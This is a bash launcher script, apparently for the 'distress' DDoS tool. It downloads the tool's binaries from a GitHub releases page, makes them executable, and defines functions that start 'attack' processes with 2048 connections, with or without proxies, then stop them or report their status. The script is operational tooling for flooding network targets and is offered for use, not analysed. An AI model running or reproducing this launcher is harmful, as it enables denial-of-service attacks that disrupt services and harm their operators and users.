#!/bin/bash


#checking for installation
#виконавча програма
EXEDir=distress
EXE=distress


############### functions ##################################

function statusAttackCommand {

    pgrep -x "$EXE" > /dev/null; echo $(($?==0));

}

function startAttackProxyCommand {

    ./$EXEDir/${EXE} -c 2048 --use-my-ip 0&

}
 
function startAttackCommand {

    ./$EXEDir/${EXE} -c 2048 --use-my-ip 100&

}

function stopAttackCommand {

    pgrep -x "$EXE" | xargs kill -9; sleep 2s;  \

}

#some statistics
function exeInfoCommand { echo "version: $(expr "$(./$EXEDir/${EXE} --version 2>&1)" : '.*distress \(.*\)')"; }

############################################################


############### init #######################################

function initEXECommand {


    initEXECommandSucceeded=true

    if $forceExeReinstall ; then

        tput setaf 3; echo "Forcing exe reinstall -> will delete the folder $EXEDir";tput setaf 6
        rm -r "$EXEDir"

    fi

    if [ -d "$EXEDir" ]
    then
        echo ""
    else
        tput setaf 3; echo "Exe dir does not exist -> will create one";tput setaf 6
        mkdir $EXEDir
    fi

    #download and install the EXE if not available
    if [ -e "$EXEDir/$EXE" ]
    then
        tput setaf 3; echo "Application already downloaded";tput setaf 6
    else

        tput setaf 3; echo "Downloading the application";tput setaf 6

        tput setaf 6;

        cd $EXEDir;

        echo "OS type: $(osType)"
        echo "OS Architecture: $(osArch)"
        #the link should be adapted because the exe names are not regular
        if [[ "$(osArch)" =~ ^("x86_64"|"aarch64"|"i686")$ && "$(osType)" == "linux" ]] ; then
            wget -O ${EXE} https://github.com/Yneth/distress-releases/releases/latest/download/distress_$(osArch)-unknown-$(osType)-musl
        elif [[ "$(osArch)" =~ ^("arm")$ && "$(osType)" == "linux" ]] ; then
            wget -O ${EXE} https://github.com/Yneth/distress-releases/releases/latest/download/distress_$(osArch)-unknown-$(osType)-musleabi
        elif [[ "$(osArch)" =~ ^("x86_64"|"i686")$ && "$(osType)" == "windows" ]] ; then
            wget -O ${EXE} https://github.com/Yneth/distress-releases/releases/latest/download/distress_$(osArch)-pc-$(osType)-msvc.exe
        elif [[ "$(osArch)" =~ ^("x86_64"|"aarch64")$ && "$(osType)" == "darwin" ]] ; then
            wget -O ${EXE} https://github.com/Yneth/distress-releases/releases/latest/download/distress_$(osArch)-apple-$(osType)
        fi

        if [ ! -s ${EXE} ]; then

            tput setaf 1; echo "Failed to download ${EXE}!"; tput setaf 6;
            initEXECommandSucceeded=false

        else

            tput setaf 3; echo "Successfully downloaded ${EXE}!"; tput setaf 6;
            chmod +x ${EXE}

        fi

        cd ..;

        #rm ${EXE}_*
        #sleep 2s;

    fi

}

############################################################

